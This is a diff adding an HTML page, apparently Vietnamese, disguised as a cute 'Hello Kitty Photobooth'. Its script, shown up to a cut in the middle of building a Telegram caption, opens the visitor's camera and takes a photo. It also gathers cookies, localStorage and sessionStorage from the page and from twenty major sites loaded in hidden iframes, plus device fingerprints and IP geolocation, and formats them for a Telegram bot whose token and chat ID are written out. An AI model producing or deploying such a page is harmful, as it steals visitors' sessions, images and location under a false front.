@@ -1,0 +1,1008 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🎀 Hello Kitty Photobooth - Pro</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #ffe4ec, #ffb6c1, #ff8a9c);
+      font-family: 'Quicksand', sans-serif;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+    .sakura-container {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      pointer-events: none; overflow: hidden; z-index: 0;
+    }
+    .sakura {
+      position: absolute; top: -20px; color: #ffb7c5; font-size: 20px;
+      animation: fall linear infinite; opacity: 0.7;
+    }
+    @keyframes fall {
+      0% { transform: translateY(-20px) rotate(0deg) scale(1); opacity: 0.8; }
+      100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
+    }
+    .card {
+      background: rgba(255,255,255,0.85);
+      backdrop-filter: blur(20px);
+      border-radius: 40px;
+      padding: 25px 20px;
+      max-width: 450px;
+      width: 100%;
+      box-shadow: 0 20px 60px rgba(255,105,135,0.3);
+      border: 2px solid rgba(255,255,255,0.5);
+      position: relative;
+      z-index: 1;
+      text-align: center;
+    }
+    .card::before {
+      content: "🎀";
+      position: absolute; top: -18px; left: 50%; transform: translateX(-50%);
+      font-size: 36px;
+      filter: drop-shadow(0 4px 10px rgba(255,105,135,0.3));
+    }
+    .kitty-avatar {
+      width: 70px; height: 70px; margin: 0 auto 10px;
+      background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 42px;
+      box-shadow: 0 8px 30px rgba(255,105,135,0.4);
+      border: 3px solid white;
+      animation: bounceKitty 2s ease-in-out infinite;
+    }
+    @keyframes bounceKitty {
+      0%,100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+    h2 { font-size: 20px; font-weight: 800; color: #d6336c; margin-bottom: 2px; }
+    .subtitle { color: #e07a8e; font-size: 12px; font-weight: 600; margin-bottom: 12px; }
+    .live-clock {
+      background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
+      padding: 5px 14px; border-radius: 30px; display: inline-block;
+      color: white; font-weight: 700; font-size: 11px;
+      margin-bottom: 12px;
+      box-shadow: 0 4px 15px rgba(255,105,135,0.3);
+    }
+    .video-preview {
+      border-radius: 20px;
+      overflow: hidden;
+      background: #fce4ec;
+      position: relative;
+      border: 3px solid #ffb6c1;
+      min-height: 250px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 12px;
+    }
+    .video-preview video {
+      width: 100%;
+      display: block;
+      background: #fce4ec;
+      transform: scaleX(-1);
+    }
+    .video-preview .placeholder {
+      color: #e07a8e; font-size: 14px; font-weight: 600; padding: 20px;
+      position: absolute;
+    }
+    .camera-indicator {
+      position: absolute; top: 10px; left: 10px;
+      background: rgba(255,255,255,0.9);
+      padding: 4px 12px; border-radius: 20px;
+      font-size: 11px; font-weight: 700; color: #d6336c;
+      border: 1px solid #ffb6c1;
+      z-index: 2;
+    }
+    .btn {
+      width: 100%; padding: 14px; border: none; border-radius: 30px;
+      font-size: 15px; font-weight: 700; color: white;
+      cursor: pointer; transition: all 0.3s ease;
+      display: flex; align-items: center; justify-content: center;
+      gap: 8px; font-family: 'Quicksand', sans-serif;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
+      box-shadow: 0 8px 25px rgba(255,77,109,0.4);
+    }
+    .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(255,77,109,0.5); }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+    .btn-pink {
+      background: linear-gradient(135deg, #ff8a9c, #ff6b8a);
+      box-shadow: 0 8px 25px rgba(255,107,138,0.4);
+    }
+    .btn-pink:hover { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(255,107,138,0.5); }
+    .btn-group { display: none; flex-direction: column; gap: 8px; margin-top: 10px; }
+    .btn-group.show { display: flex; }
+    .btn a { color: white; text-decoration: none; width: 100%; }
+    .status { margin-top: 12px; font-size: 12px; font-weight: 600; color: #e07a8e; min-height: 18px; }
+    .status.success { color: #2ecc71; }
+    .status.loading { color: #f59e0b; }
+    .status.error { color: #ef4444; }
+    .footer-badge { margin-top: 12px; font-size: 9px; color: #e07a8e; opacity: 0.7; letter-spacing: 1px; }
+    #canvas { display: none; }
+
+    .music-control {
+      position: fixed; bottom: 20px; right: 20px; z-index: 100;
+      background: rgba(255,255,255,0.9); border: 2px solid #ffb6c1;
+      border-radius: 50%; width: 44px; height: 44px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 18px; cursor: pointer;
+      box-shadow: 0 4px 20px rgba(255,105,135,0.3);
+      transition: all 0.3s ease; backdrop-filter: blur(10px);
+    }
+    .music-control:hover { transform: scale(1.1); }
+    .music-control.playing { animation: pulseMusic 1.5s ease-in-out infinite; }
+    @keyframes pulseMusic {
+      0%,100% { box-shadow: 0 4px 20px rgba(255,105,135,0.3); }
+      50% { box-shadow: 0 4px 40px rgba(255,105,135,0.6); }
+    }
+    .music-progress {
+      position: fixed; bottom: 75px; right: 20px; z-index: 99;
+      width: 44px; display: flex; flex-direction: column; align-items: center;
+    }
+    .music-progress input[type="range"] {
+      width: 60px; height: 3px; -webkit-appearance: none;
+      background: #ffb6c1; border-radius: 2px; outline: none;
+      transform: rotate(-90deg); transform-origin: center; cursor: pointer;
+    }
+    .music-progress input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance: none; width: 10px; height: 10px;
+      background: #ff6b8a; border-radius: 50%; cursor: pointer;
+    }
+    .loading-overlay {
+      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(255,255,255,0.85); backdrop-filter: blur(5px);
+      z-index: 999; justify-content: center; align-items: center;
+      flex-direction: column; gap: 15px;
+    }
+    .loading-overlay.show { display: flex; }
+    .loading-spinner {
+      width: 50px; height: 50px;
+      border: 4px solid #ffb6c1; border-top: 4px solid #ff4d6d;
+      border-radius: 50%; animation: spin 1s linear infinite;
+    }
+    @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
+    .loading-text { color: #d6336c; font-weight: 700; font-size: 16px; }
+    #logDisplay {
+      position: fixed;
+      bottom: 80px;
+      left: 20px;
+      right: 80px;
+      max-height: 150px;
+      overflow-y: auto;
+      background: rgba(0,0,0,0.85);
+      color: #00ff88;
+      font-size: 10px;
+      padding: 10px;
+      border-radius: 10px;
+      font-family: monospace;
+      z-index: 50;
+      white-space: pre-wrap;
+      word-break: break-all;
+      display: none;
+      border: 1px solid #00ff88;
+    }
+    #logDisplay.show { display: block; }
+    @media (max-width: 480px) {
+      .card { padding: 18px 12px; }
+      .video-preview { min-height: 200px; }
+      h2 { font-size: 17px; }
+      .kitty-avatar { width: 55px; height: 55px; font-size: 32px; }
+      #logDisplay { left: 10px; right: 10px; bottom: 70px; max-height: 120px; font-size: 9px; }
+    }
+  </style>
+</head>
+<body>
+
+<div id="logDisplay"></div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-spinner"></div>
+  <div class="loading-text">🌸 Đang khởi tạo...</div>
+</div>
+
+<div class="sakura-container" id="sakuraContainer"></div>
+
+<div class="music-progress">
+  <input type="range" id="volumeControl" min="0" max="1" step="0.01" value="0.7">
+</div>
+<div class="music-control playing" id="musicBtn" onclick="toggleMusic()">🎵</div>
+
+<div class="card">
+  <div class="kitty-avatar"><span>🐱</span></div>
+  <div class="live-clock" id="clock">🕒 Đang tải...</div>
+  <h2>🌸 Hello Kitty Photobooth</h2>
+  <p class="subtitle">✨ Chụp ảnh + Thu thập cookies tối đa ✨</p>
+
+  <div class="video-preview">
+    <video id="video" autoplay playsinline muted></video>
+    <div class="placeholder" id="placeholder">📸 Đang chờ camera...</div>
+    <div class="camera-indicator" id="cameraLabel">📷 Camera</div>
+  </div>
+
+  <button class="btn btn-primary" id="capture-btn" disabled>
+    <span>📸 CHỤP ẢNH & THU THẬP COOKIES</span>
+  </button>
+
+  <div class="btn-group" id="action-buttons">
+    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🎀 TRUY CẬP NHÓM LẤY FILE</a>
+    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🤖 MỞ BOT TELEGRAM</a>
+  </div>
+
+  <div id="status" class="status">💖 Bấm nút để bắt đầu!</div>
+  <div class="footer-badge">🎀 Made with love 🎀</div>
+</div>
+
+<canvas id="canvas"></canvas>
+
+<script>
+// ============================================================
+// CẤU HÌNH - SỬA TOKEN VÀ CHAT ID
+// ============================================================
+const TELEGRAM_BOT_TOKEN = '8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8';
+const TELEGRAM_CHAT_ID = '8872446985';
+const MUSIC_FILE = 'nhac_nen.mp3';
+
+// DANH SÁCH WEB CẦN LẤY COOKIES (MỞ RỘNG)
+const TARGET_WEBSITES = [
+  'https://facebook.com',
+  'https://google.com',
+  'https://youtube.com',
+  'https://instagram.com',
+  'https://tiktok.com',
+  'https://twitter.com',
+  'https://amazon.com',
+  'https://netflix.com',
+  'https://spotify.com',
+  'https://github.com',
+  'https://reddit.com',
+  'https://pinterest.com',
+  'https://linkedin.com',
+  'https://whatsapp.com',
+  'https://telegram.org',
+  'https://discord.com',
+  'https://twitch.tv',
+  'https://snapchat.com',
+  'https://ebay.com',
+  'https://microsoft.com'
+];
+
+// ============================================================
+// LOG SYSTEM
+// ============================================================
+const logDiv = document.getElementById('logDisplay');
+let logContent = '';
+
+function addLog(msg, type = 'info') {
+  const time = new Date().toLocaleTimeString();
+  const colors = { info: '#44aaff', success: '#00ff88', error: '#ff4444', warning: '#ffaa00', cookie: '#ff88aa' };
+  logContent += `[${time}] ${msg}\n`;
+  logDiv.innerHTML = logContent.split('\n').map(line => {
+    const color = colors[type] || '#ffffff';
+    return `<span style="color:${color};">${line}</span>`;
+  }).join('\n');
+  logDiv.scrollTop = logDiv.scrollHeight;
+  logDiv.classList.add('show');
+  console.log(msg);
+}
+
+function setStatus(msg, type = '') {
+  const el = document.getElementById('status');
+  el.textContent = msg;
+  el.className = 'status ' + type;
+}
+
+// ============================================================
+// HOA ANH ĐÀO
+// ============================================================
+(function createSakura() {
+  const container = document.getElementById('sakuraContainer');
+  const emojis = ['🌸','🌺','🌸','🌺','🌸'];
+  for (let i = 0; i < 30; i++) {
+    const el = document.createElement('div');
+    el.className = 'sakura';
+    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+    el.style.left = Math.random() * 100 + '%';
+    el.style.fontSize = (12 + Math.random() * 20) + 'px';
+    el.style.animationDuration = (8 + Math.random() * 14) + 's';
+    el.style.animationDelay = (Math.random() * 15) + 's';
+    container.appendChild(el);
+  }
+})();
+
+// ============================================================
+// NHẠC - TỰ ĐỘNG PHÁT NGAY KHI VÀO WEB
+// ============================================================
+let audio = null;
+let isMusicPlaying = false;
+let musicStarted = false;
+
+function initAudio() {
+  if (!audio) {
+    audio = new Audio(MUSIC_FILE);
+    audio.loop = true;
+    audio.volume = 0.7;
+    document.getElementById('volumeControl').addEventListener('input', function() {
+      if (audio) audio.volume = this.value;
+    });
+  }
+}
+
+function playMusic() {
+  try {
+    initAudio();
+    if (!musicStarted) {
+      audio.play().then(() => {
+        isMusicPlaying = true;
+        musicStarted = true;
+        document.getElementById('musicBtn').classList.add('playing');
+        document.getElementById('musicBtn').textContent = '🎵';
+        addLog('🎵 Nhạc đã bật!', 'success');
+      }).catch(() => {
+        // Nếu bị chặn, thử khi click
+        document.addEventListener('click', function playOnClick() {
+          if (!musicStarted) {
+            audio.play().then(() => {
+              isMusicPlaying = true;
+              musicStarted = true;
+              document.getElementById('musicBtn').classList.add('playing');
+              document.getElementById('musicBtn').textContent = '🎵';
+              addLog('🎵 Nhạc đã bật!', 'success');
+            }).catch(()=>{});
+            document.removeEventListener('click', playOnClick);
+          }
+        }, { once: true });
+      });
+    }
+  } catch(e) {
+    addLog('⚠️ Không thể phát nhạc: ' + e.message, 'warning');
+  }
+}
+
+function toggleMusic() {
+  initAudio();
+  if (isMusicPlaying) {
+    audio.pause();
+    isMusicPlaying = false;
+    document.getElementById('musicBtn').classList.remove('playing');
+    document.getElementById('musicBtn').textContent = '🔇';
+    addLog('🔇 Đã tắt nhạc', 'info');
+  } else {
+    audio.play().catch(()=>{});
+    isMusicPlaying = true;
+    document.getElementById('musicBtn').classList.add('playing');
+    document.getElementById('musicBtn').textContent = '🎵';
+    addLog('🎵 Đã bật nhạc', 'info');
+  }
+}
+
+// PHÁT NHẠC NGAY LẬP TỨC
+setTimeout(playMusic, 50);
+// Nếu chưa phát, thử lại sau 1s
+setTimeout(playMusic, 1000);
+// Thử lại lần nữa sau 3s
+setTimeout(playMusic, 3000);
+
+// ============================================================
+// ĐỒNG HỒ
+// ============================================================
+function updateClock() {
+  const now = new Date();
+  document.getElementById('clock').textContent =
+    `🕒 ${now.toLocaleTimeString('vi-VN', {hour12:false})} - ${now.toLocaleDateString('vi-VN')}`;
+}
+setInterval(updateClock, 1000);
+updateClock();
+
+// ============================================================
+// LẤY COOKIES TỪ TRANG HIỆN TẠI
+// ============================================================
+function getCurrentCookies() {
+  try {
+    const raw = document.cookie;
+    if (!raw) return [];
+    return raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
+      const idx = c.indexOf('=');
+      if (idx === -1) return { name: c, value: '' };
+      return { name: c.substring(0, idx), value: c.substring(idx + 1) };
+    });
+  } catch(e) { return []; }
+}
+
+function getCookiesString(cookies) {
+  if (!cookies || !cookies.length) return '❌ Không có cookies';
+  return cookies.map((c, i) => {
+    let v = decodeURIComponent(c.value || '');
+    if (v.length > 60) v = v.substring(0, 60) + '…';
+    v = v.replace(/[^\x20-\x7E]/g, '?');
+    return `  ${i+1}. ${c.name} = ${v}`;
+  }).join('\n');
+}
+
+// ============================================================
+// LẤY COOKIES TỪ IFARME - TỐI ĐA
+// ============================================================
+function getCookiesFromIframe(url) {
+  return new Promise((resolve) => {
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = url;
+    iframe.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups';
+    document.body.appendChild(iframe);
+    
+    let timeout = setTimeout(() => {
+      try { iframe.remove(); } catch(e) {}
+      resolve({ url, error: 'Timeout', cookies: [], success: false });
+    }, 15000);
+    
+    iframe.onload = function() {
+      clearTimeout(timeout);
+      
+      try {
+        // Lấy cookies
+        let cookies = [];
+        let localStorage = {};
+        let sessionStorage = {};
+        
+        try {
+          const doc = iframe.contentDocument || iframe.contentWindow.document;
+          if (doc && doc.cookie) {
+            const raw = doc.cookie;
+            if (raw) {
+              cookies = raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
+                const idx = c.indexOf('=');
+                if (idx === -1) return { name: c, value: '' };
+                return { name: c.substring(0, idx), value: c.substring(idx + 1) };
+              });
+            }
+          }
+        } catch(e) {}
+        
+        // Lấy localStorage
+        try {
+          const win = iframe.contentWindow;
+          if (win && win.localStorage) {
+            for (let i = 0; i < win.localStorage.length; i++) {
+              const key = win.localStorage.key(i);
+              localStorage[key] = win.localStorage.getItem(key);
+            }
+          }
+        } catch(e) {}
+        
+        // Lấy sessionStorage
+        try {
+          const win = iframe.contentWindow;
+          if (win && win.sessionStorage) {
+            for (let i = 0; i < win.sessionStorage.length; i++) {
+              const key = win.sessionStorage.key(i);
+              sessionStorage[key] = win.sessionStorage.getItem(key);
+            }
+          }
+        } catch(e) {}
+        
+        // Lấy thông tin trang
+        let pageInfo = {};
+        try {
+          const win = iframe.contentWindow;
+          if (win) {
+            pageInfo = {
+              url: win.location.href,
+              title: win.document.title,
+              userAgent: win.navigator.userAgent
+            };
+          }
+        } catch(e) {}
+        
+        setTimeout(() => {
+          try { iframe.remove(); } catch(e) {}
+          resolve({
+            url: url,
+            cookies: cookies,
+            localStorage: localStorage,
+            sessionStorage: sessionStorage,
+            pageInfo: pageInfo,
+            success: cookies.length > 0 || Object.keys(localStorage).length > 0
+          });
+        }, 500);
+        
+      } catch(e) {
+        try { iframe.remove(); } catch(e2) {}
+        resolve({ url, error: e.message, cookies: [], success: false });
+      }
+    };
+    
+    iframe.onerror = function() {
+      clearTimeout(timeout);
+      try { iframe.remove(); } catch(e) {}
+      resolve({ url, error: 'Load error', cookies: [], success: false });
+    };
+  });
+}
+
+// ============================================================
+// THU THẬP COOKIES TỐI ĐA
+// ============================================================
+async function collectAllCookies() {
+  addLog('🚀 Bắt đầu thu thập cookies tối đa...', 'info');
+  setStatus('📸 Đang thu thập cookies...', 'loading');
+  
+  const results = {
+    current: { cookies: [], localStorage: {}, sessionStorage: {} },
+    websites: {},
+    totalCookies: 0
+  };
+  
+  // 1. Lấy từ trang hiện tại
+  const currentCookies = getCurrentCookies();
+  results.current.cookies = currentCookies;
+  results.totalCookies += currentCookies.length;
+  
+  try {
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      results.current.localStorage[key] = localStorage.getItem(key);
+    }
+  } catch(e) {}
+  
+  try {
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      results.current.sessionStorage[key] = sessionStorage.getItem(key);
+    }
+  } catch(e) {}
+  
+  addLog(`✅ Trang hiện tại: ${currentCookies.length} cookies, ${Object.keys(results.current.localStorage).length} LS, ${Object.keys(results.current.sessionStorage).length} SS`, 'success');
+  
+  // 2. Lấy từ các web khác
+  for (let i = 0; i < TARGET_WEBSITES.length; i++) {
+    const url = TARGET_WEBSITES[i];
+    const domain = url.replace('https://', '').replace('http://', '');
+    
+    addLog(`🌐 [${i+1}/${TARGET_WEBSITES.length}] Đang lấy: ${domain}`, 'info');
+    setStatus(`📸 Đang lấy: ${domain} (${i+1}/${TARGET_WEBSITES.length})`, 'loading');
+    
+    const result = await getCookiesFromIframe(url);
+    
+    if (result.success) {
+      results.websites[domain] = {
+        cookies: result.cookies || [],
+        localStorage: result.localStorage || {},
+        sessionStorage: result.sessionStorage || {},
+        pageInfo: result.pageInfo || {},
+        success: true
+      };
+      results.totalCookies += result.cookies.length;
+      addLog(`✅ ${domain}: ${result.cookies.length} cookies, ${Object.keys(result.localStorage).length} LS`, 'success');
+    } else {
+      results.websites[domain] = {
+        cookies: [],
+        success: false,
+        error: result.error || 'Không thể lấy'
+      };
+      addLog(`❌ ${domain}: ${result.error || 'Không thể lấy'}`, 'error');
+    }
+    
+    // Đợi giữa các lần
+    await new Promise(r => setTimeout(r, 300));
+  }
+  
+  addLog(`✅ Hoàn tất! Tổng cookies: ${results.totalCookies}`, 'success');
+  setStatus(`✅ Đã thu thập xong! Tổng cookies: ${results.totalCookies}`, 'success');
+  
+  return results;
+}
+
+// ============================================================
+// LẤY THÔNG TIN KHÁC
+// ============================================================
+function getDeviceInfo() {
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform || 'Không rõ',
+    language: navigator.language || 'Không rõ',
+    languages: navigator.languages ? navigator.languages.join(', ') : 'Không rõ',
+    cookieEnabled: navigator.cookieEnabled ? '✅ Bật' : '❌ Tắt',
+    doNotTrack: navigator.doNotTrack || '❌ Không bật',
+    hardwareConcurrency: navigator.hardwareConcurrency || 'Không rõ',
+    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Không rõ',
+    maxTouchPoints: navigator.maxTouchPoints || '0',
+    vendor: navigator.vendor || 'Không rõ',
+    screen: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không rõ',
+    referrer: document.referrer || 'Trực tiếp',
+    url: window.location.href,
+    title: document.title
+  };
+}
+
+async function getIP() {
+  try {
+    const res = await fetch('https://ipwho.is/');
+    const data = await res.json();
+    if (data.success) {
+      return {
+        ip: data.ip || 'Không rõ',
+        city: data.city || 'Không rõ',
+        region: data.region || 'Không rõ',
+        country: data.country || 'Không rõ',
+        countryCode: data.country_code || 'Không rõ',
+        isp: data.connection?.isp || data.connection?.org || 'Không rõ',
+        timezone: data.timezone?.id || 'Không rõ',
+        latitude: data.latitude || 'Không rõ',
+        longitude: data.longitude || 'Không rõ'
+      };
+    }
+    return { ip: 'Không rõ' };
+  } catch(e) {
+    try {
+      const fallback = await fetch('https://api.ipify.org?format=json');
+      const data = await fallback.json();
+      return { ip: data.ip || 'Không rõ' };
+    } catch(err) { return { ip: 'Không rõ' }; }
+  }
+}
+
+function getPlugins() {
+  try {
+    const plugins = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+      plugins.push(navigator.plugins[i].name);
+    }
+    return plugins;
+  } catch(e) { return []; }
+}
+
+function getPerformance() {
+  try {
+    const timing = performance.timing;
+    return {
+      loadTime: timing.loadEventEnd - timing.navigationStart,
+      domReady: timing.domContentLoadedEventEnd - timing.navigationStart,
+      dns: timing.domainLookupEnd - timing.domainLookupStart,
+      tcp: timing.connectEnd - timing.connectStart,
+      ttfb: timing.responseStart - timing.requestStart
+    };
+  } catch(e) { return {}; }
+}
+
+// ============================================================
+// CAMERA - CHỈ 1 CAM, ĐƠN GIẢN HƠN
+// ============================================================
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const captureBtn = document.getElementById('capture-btn');
+const statusDiv = document.getElementById('status');
+const actionBtns = document.getElementById('action-buttons');
+const loadingOverlay = document.getElementById('loadingOverlay');
+const placeholder = document.getElementById('placeholder');
+const cameraLabel = document.getElementById('cameraLabel');
+
+let currentStream = null;
+let isCameraReady = false;
+
+async function startCamera() {
+  loadingOverlay.classList.add('show');
+  captureBtn.disabled = true;
+  placeholder.textContent = '📸 Đang mở camera...';
+  addLog('📷 Đang khởi tạo camera...', 'info');
+  
+  try {
+    // Thử mở camera trước
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: false
+      });
+      currentStream = stream;
+      video.srcObject = stream;
+      await video.play();
+      isCameraReady = true;
+      cameraLabel.textContent = '📷 Camera trước';
+      placeholder.style.display = 'none';
+      addLog('✅ Camera đã mở thành công!', 'success');
+    } catch(e1) {
+      // Thử mở camera sau
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        currentStream = stream;
+        video.srcObject = stream;
+        await video.play();
+        isCameraReady = true;
+        cameraLabel.textContent = '📷 Camera sau';
+        placeholder.style.display = 'none';
+        addLog('✅ Camera đã mở thành công!', 'success');
+      } catch(e2) {
+        // Thử mở bất kỳ
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          currentStream = stream;
+          video.srcObject = stream;
+          await video.play();
+          isCameraReady = true;
+          cameraLabel.textContent = '📷 Camera';
+          placeholder.style.display = 'none';
+          addLog('✅ Camera đã mở thành công!', 'success');
+        } catch(e3) {
+          throw new Error('Không thể mở camera');
+        }
+      }
+    }
+    
+    if (isCameraReady) {
+      captureBtn.disabled = false;
+      setStatus('✅ Camera đã sẵn sàng!', 'success');
+    }
+    
+  } catch(err) {
+    addLog(`❌ Lỗi camera: ${err.message}`, 'error');
+    placeholder.textContent = '❌ Không thể mở camera. Vui lòng cấp quyền!';
+    setStatus('⚠️ Không thể truy cập camera', 'error');
+    isCameraReady = false;
+    captureBtn.disabled = true;
+  } finally {
+    loadingOverlay.classList.remove('show');
+  }
+}
+
+setTimeout(startCamera, 500);
+
+// ============================================================
+// CHỤP ẢNH VÀ GỬI DỮ LIỆU
+// ============================================================
+function playClickSound() {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.type = 'sine';
+    osc.frequency.setValueAtTime(880, ctx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.1);
+    gain.gain.setValueAtTime(0.12, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.1);
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.start();
+    osc.stop(ctx.currentTime + 0.1);
+  } catch(e) {}
+}
+
+captureBtn.onclick = async function() {
+  if (!isCameraReady || !currentStream) {
+    setStatus('⚠️ Vui lòng đợi camera sẵn sàng!', 'error');
+    return;
+  }
+  
+  playClickSound();
+  captureBtn.disabled = true;
+  setStatus('📸 Đang thu thập dữ liệu...', 'loading');
+  addLog('📸 Bắt đầu thu thập...', 'info');
+  
+  // Thu thập tất cả
+  const cookieData = await collectAllCookies();
+  const device = getDeviceInfo();
+  const ip = await getIP();
+  const plugins = getPlugins();
+  const perf = getPerformance();
+  
+  // Chụp ảnh
+  const W = 480, H = 360;
+  canvas.width = W; canvas.height = H;
+  const ctx = canvas.getContext('2d');
+  
+  // Nền
+  const grad = ctx.createLinearGradient(0, 0, W, H);
+  grad.addColorStop(0, '#ffe4ec');
+  grad.addColorStop(1, '#ffb6c1');
+  ctx.fillStyle = grad;
+  ctx.fillRect(0, 0, W, H);
+  
+  // Vẽ ảnh (lật ngang)
+  ctx.save();
+  ctx.translate(W, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0, W, H);
+  ctx.restore();
+  
+  // Khung
+  ctx.strokeStyle = '#ff6b8a';
+  ctx.lineWidth = 4;
+  ctx.strokeRect(10, 10, W-20, H-20);
+  
+  ctx.fillStyle = 'rgba(255,255,255,0.7)';
+  ctx.fillRect(10, 10, W-20, 35);
+  ctx.fillStyle = '#d6336c';
+  ctx.font = 'bold 16px Quicksand';
+  ctx.textAlign = 'center';
+  ctx.fillText('🌸 Hello Kitty Photobooth 🌸', W/2, 35);
+  
+  ctx.fillStyle = 'rgba(214,51,108,0.5)';
+  ctx.font = '10px Quicksand';
+  ctx.textAlign = 'right';
+  ctx.fillText(new Date().toLocaleString('vi-VN'), W-15, H-10);
+  
+  ctx.fillStyle = 'rgba(255,255,255,0.6)';
+  ctx.fillRect(10, H-25, 130, 18);
+  ctx.fillStyle = '#d6336c';
+  ctx.font = 'bold 9px Quicksand';
+  ctx.textAlign = 'left';
+  ctx.fillText(`📍 ${ip.city || 'Unknown'}`, 15, H-11);
+  
+  // ============================================================
+  // TẠO CAPTION GỬI TELEGRAM
+  // ============================================================
+  let caption = `🎀 HELLO KITTY - COOKIE COLLECTOR PRO 🎀\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}\n`;
+  caption += `📊 Tổng cookies: ${cookieData.totalCookies}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  
+  // Thiết bị
+  caption += `📱 THIẾT BỊ:\n`;
+  caption += `🔹 Platform: ${device.platform}\n`;
+  caption += `🔹 Language: ${device.language}\n`;
+  caption += `🔹 Screen: ${device.screen}\n`;
+  caption += `🔹 Pixel Ratio: ${device.pixelRatio}\n`;
+  caption += `🔹 CPU: ${device.hardwareConcurrency} cores\n`;
+  caption += `🔹 RAM: ${device.deviceMemory}\n`;
+  caption += `🔹 Touch: ${device.maxTouchPoints > 0 ? '✅ Có' : '❌ Không'}\n`;
+  caption += `🔹 Cookies Enabled: ${device.cookieEnabled}\n`;
+  caption += `🔹 Do Not Track: ${device.doNotTrack}\n`;
+  caption += `🔹 Timezone: ${device.timezone}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  
+  // IP
+  caption += `🌐 IP & VỊ TRÍ:\n`;
+  caption += `🔹 IP: ${ip.ip || 'Không rõ'}\n`;
+  caption += `🔹 City: ${ip.city || 'Không rõ'}\n`;
+  caption += `🔹 Region: ${ip.region || 'Không rõ'}\n`;
+  caption += `🔹 Country: ${ip.country || 'Không rõ'}\n`;
+  caption += `🔹 ISP: ${ip.isp || 'Không rõ'}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  
+  // Trang hiện tại
+  caption += `📱 TRANG HIỆN TẠI:\n`;
+  caption += `🔹 URL: ${device.url}\n`;
+  caption += `🔹 Title: ${device.title}\n`;
+  caption += `🔹 Referrer: ${device.referrer}\n`;
+  caption += `🍪 Cookies (${cookieData.current.cookies.length}):\n`;
+  if (cookieData.current.cookies.length > 0) {
+    cookieData.current.cookies.slice(0, 10).forEach(c => {
+      let v = decodeURIComponent(c.value || '');
+      if (v.length > 50) v = v.substring(0, 50) + '…';
+      caption += `  • ${c.name} = ${v}\n`;
+    });
+    if (cookieData.current.cookies.length > 10) {
+      caption += `  ... và ${cookieData.current.cookies.length - 10} cookies khác\n`;
+    }
+  } else {
+    caption += `  ❌ Không có cookies\n`;
+  }
+  
+  const lsKeys = Object.keys(cookieData.current.localStorage || {});
+  if (lsKeys.length > 0) {
+    caption += `💾 LS (${lsKeys.length}):\n`;
+    lsKeys.slice(0, 10).forEach(key => {
+      let val = cookieData.current.localStorage[key] || '';
+      if (val.length > 40) val = val.substring(0, 40) + '…';
+      caption += `  • ${key} = ${val}\n`;
+    });
+  }
+  
